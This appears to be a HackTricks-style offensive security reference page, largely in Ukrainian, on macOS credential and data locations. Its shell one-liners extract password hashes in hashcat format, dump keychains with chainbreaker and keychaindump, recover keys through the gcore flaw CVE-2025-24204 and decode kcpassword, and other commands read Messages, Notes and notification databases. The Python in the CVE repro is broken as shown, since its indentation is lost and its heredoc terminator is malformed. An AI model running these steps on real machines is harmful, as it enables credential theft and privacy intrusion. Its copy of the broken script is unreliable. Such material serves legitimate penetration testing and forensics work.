# macOS Sensitive Locations & Interesting Daemons

{{#include ../../../banners/hacktricks-training.md}}

## Паролі

### Shadow Passwords

Shadow password зберігається з конфігурацією користувача у plists, розташованих у **`/var/db/dslocal/nodes/Default/users/`**.\
Наступний oneliner можна використати, щоб вивантажити **всю інформацію про користувачів** (включно з hash info):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) or [**this one**](https://github.com/octomagon/davegrohl.git) can be used to transform the hash to **hashcat** **format**.

Альтернативний one-liner, який вивантажить creds усіх non-service accounts у форматі hashcat `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Інший спосіб отримати `ShadowHashData` користувача — використати `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Цей файл **використовується лише** тоді, коли system id запущений у **single-user mode** (тобто не дуже часто).

### Keychain Dump

Зверніть увагу, що під час використання binary `security` для **dump the passwords decrypted**, користувачу буде показано кілька prompts, щоб дозволити цю операцію.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
На сучасному macOS найцікавіші backing stores зазвичай **`~/Library/Keychains/login.keychain-db`** і **`/Library/Keychains/System.keychain`**. Це файли на базі SQLite, але plaintext-доступ усе ще посередковується **`securityd`**: крадіжка сирої DB здебільшого дає вам лише метадані та зашифровані blobs, якщо тільки ви також не відновите пароль користувача, `SystemKey` або master key у пам’яті.

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Based on this comment [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) схоже, що ці tools більше не працюють у Big Sur.

### Огляд Keychaindump

Інструмент під назвою **keychaindump** був розроблений для витягування паролів із macOS keychains, але він має обмеження на новіших версіях macOS, таких як Big Sur, як зазначено в [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Використання **keychaindump** вимагає, щоб attacker отримав доступ і підвищив privileges до **root**. Інструмент експлуатує той факт, що keychain за замовчуванням розблоковується під час входу користувача для зручності, дозволяючи applications отримувати доступ до нього без повторного запиту пароля користувача. Однак якщо користувач обирає блокувати свій keychain після кожного використання, **keychaindump** стає неефективним.

**keychaindump** працює, націлюючись на конкретний process під назвою **securityd**, який Apple описує як daemon для authorization і cryptographic operations, критично важливий для доступу до keychain. Процес витягування включає визначення **Master Key**, похідного від login password користувача. Цей key є необхідним для читання keychain file. Щоб знайти **Master Key**, **keychaindump** сканує memory heap процесу **securityd** за допомогою команди `vmmap`, шукаючи потенційні keys у ділянках, позначених як `MALLOC_TINY`. Для перевірки цих memory locations використовується така команда:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Після визначення потенційних master keys, **keychaindump** шукає у heaps певний pattern (`0x0000000000000018`), який вказує на candidate для master key. Подальші кроки, включно з deobfuscation, потрібні для використання цього key, як описано в source code **keychaindump**. Analysts, які зосереджуються на цій area, повинні зазначити, що crucial data для decrypting keychain зберігаються в memory процесу **securityd**. Приклад command для запуску **keychaindump**:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) можна використовувати для вилучення таких типів інформації з keychain OSX у криміналістично коректний спосіб:

- Хешований пароль Keychain, придатний для cracking з [hashcat](https://hashcat.net/hashcat/) або [John the Ripper](https://www.openwall.com/john/)
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

За наявності пароля для розблокування keychain, master key, отриманого за допомогою [volafox](https://github.com/n0fate/volafox) або [volatility](https://github.com/volatilityfoundation/volatility), чи unlock file, наприклад SystemKey, Chainbreaker також надасть plaintext passwords.

Без одного з цих методів розблокування Keychain Chainbreaker покаже всю іншу доступну інформацію.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) with SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) cracking the hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Витягнути ключі keychain (з паролями) через дамп пам’яті**

[Follow these steps](../index.html#dumping-memory-with-osxpmem), щоб виконати **дамп пам’яті**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Витягнути ключі keychain (з паролями) за допомогою пароля користувача**

Якщо ви знаєте пароль користувача, ви можете використати його, щоб **витягнути й розшифрувати keychains, які належать користувачу**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Головний ключ Keychain через entitlement `gcore` (CVE-2025-24204)

macOS 15.0 (Sequoia) постачала `/usr/bin/gcore` з **`com.apple.system-task-ports.read`** entitlement, тож будь-який local admin (або malicious signed app) міг дампити **пам’ять будь-якого process навіть із увімкненими SIP/TCC**. Дамп `securityd` leak-ить **Keychain master key** у відкритому вигляді та дозволяє дешифрувати `login.keychain-db` без пароля користувача.

**Quick repro on vulnerable builds (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Feed the extracted hex key to Chainbreaker (`--key <hex>`) to decrypt the login keychain. Apple removed the entitlement in **macOS 15.3+**, so this only works on unpatched Sequoia builds or systems that kept the vulnerable binary.

### kcpassword

Файл **kcpassword** — це файл, що містить **пароль входу користувача**, але лише якщо власник системи **увімкнув автоматичний вхід**. Тому користувач буде автоматично входити в систему без запиту пароля (це не дуже безпечно).

Пароль зберігається у файлі **`/etc/kcpassword`** XOR-ований із ключем **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Якщо пароль користувача довший за ключ, ключ буде використано повторно.\
Це робить пароль досить легким для відновлення, наприклад за допомогою скриптів на кшталт [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interesting Information in Databases

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifications

До **Sequoia** зазвичай можна знайти сховище Notification Center у **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. У **Sequoia+** Apple перемістила його до захищеного TCC group container **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

Більшість цікавої інформації зберігається всередині стовпців **blob**, тож вам потрібно буде витягти цей вміст і перетворити його на щось читабельне для людини (`plutil -p -`, `strings` або невеликий parser). Приклади швидкого triage:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Нещодавні проблеми з конфіденційністю (NotificationCenter DB)

- У macOS **14.7–15.1** Apple зберігала вміст банерів у SQLite `db2/db` без належного redaction. CVE **CVE-2024-44292/44293/40838/54504** дозволяли будь-якому локальному користувачу читати текст сповіщень інших користувачів, просто відкривши DB (без запиту TCC).
- Apple зменшила ризик, перемістивши DB до `group.com.apple.usernoted` і захистивши її за допомогою TCC у новіших збірках Sequoia, тому на сучасних системах зазвичай потрібен правильний user context або TCC bypass, щоб прочитати її.
- На застарілих endpoints скопіюйте файли `db`, `db-wal` і `db-shm` разом перед оновленням або перезавантаженням, якщо хочете зберегти artefacts.

### Notes

Користувацькі **notes** можна знайти в `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
Якщо наведений вище one-liner занадто шумний, експортуйте `ZICNOTEDATA.ZDATA`, розпакуйте його через gunzip і розберіть protobuf: зазвичай це надійніше, ніж запускати `strings` напряму на SQLite.

### Background Tasks / Login Items

Починаючи з **Ventura**, user-approved login items і кілька background tasks відстежуються в сховищах **BTM**, таких як **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** і версіонований системний cache **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Ці файли корисні для швидкого виявлення persistence, helper tools і деяких background items, керованих через MDM:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Для аспекту persistence і внутрішньої роботи BTM дивіться [the auto-start locations page](../../macos-auto-start-locations.md#login-items) та [the Background Tasks Management notes](../macos-security-protections/README.md#background-tasks-management).

## Preferences

У macOS налаштування розташовані в **`$HOME/Library/Preferences`**, а в iOS — у `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

У macOS утиліту cli **`defaults`** можна використовувати для **модифікації файлу Preferences**.

**`/usr/sbin/cfprefsd`** заявляє XPC services `com.apple.cfprefsd.daemon` і `com.apple.cfprefsd.agent` та може бути викликана для виконання дій, таких як зміна налаштувань.

## OpenDirectory permissions.plist

Файл `/System/Library/OpenDirectory/permissions.plist` містить permissions, застосовані до node attributes, і захищений SIP.\
Цей файл надає permissions конкретним користувачам за UUID (а не uid), щоб вони могли отримувати доступ до певної чутливої інформації, як-от `ShadowHashData`, `HeimdalSRPKey` і `KerberosKeys`, серед інших:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## System Notifications

### Darwin Notifications

Основним daemon для notifications є **`/usr/sbin/notifyd`**. Щоб отримувати notifications, clients мають зареєструватися через Mach port `com.apple.system.notification_center` (перевірити їх можна за допомогою `sudo lsmp -p <pid notifyd>`). Daemon налаштовується через файл `/etc/notify.conf`.

Назви, що використовуються для notifications, є унікальними reverse DNS notation, і коли notification надсилається до однієї з них, client(s), які вказали, що можуть його обробити, отримають його.

Можна вивантажити поточний статус (і побачити всі назви), надіславши сигнал SIGUSR2 процесу notifyd і прочитавши згенерований файл: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

**Distributed Notification Center**, основний бінарний файл якого — **`/usr/sbin/distnoted`**, є ще одним способом надсилати сповіщення. Він надає деякі XPC services і виконує певні перевірки, щоб спробувати верифікувати клієнтів.

### Apple Push Notifications (APN)

У цьому випадку applications можуть реєструватися для **topics**. Клієнт згенерує token, звернувшись до серверів Apple через **`apsd`**.\
Потім providers також згенерують token і зможуть підключитися до серверів Apple, щоб надсилати messages клієнтам. Ці messages будуть локально отримані **`apsd`**, який передасть notification application, що очікує її.

Preferences розташовані в `/Library/Preferences/com.apple.apsd.plist`.

У macOS є локальна database messages, розташована в `/Library/Application\ Support/ApplePushService/aps.db`, а в iOS — у `/var/mobile/Library/ApplePushService`. Вона має 3 tables: `incoming_messages`, `outgoing_messages` і `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Також можливо отримати інформацію про демон і з’єднання, використовуючи:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Сповіщення користувача

Це сповіщення, які користувач має бачити на екрані:

- **`CFUserNotification`**: Ці API надають спосіб показати на екрані pop-up із повідомленням.
- **The Bulletin Board**: Це показує в iOS банер, який зникає та буде збережений у Notification Center.
- **`NSUserNotificationCenter`**: Це iOS bulletin board у MacOS. На старіших релізах macOS база даних зазвичай знаходиться в `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; на Sequoia+ її було перенесено до `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## References

- **[HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)**
- **[Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)**
- **[9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)**

{{#include ../../../banners/hacktricks-training.md}}
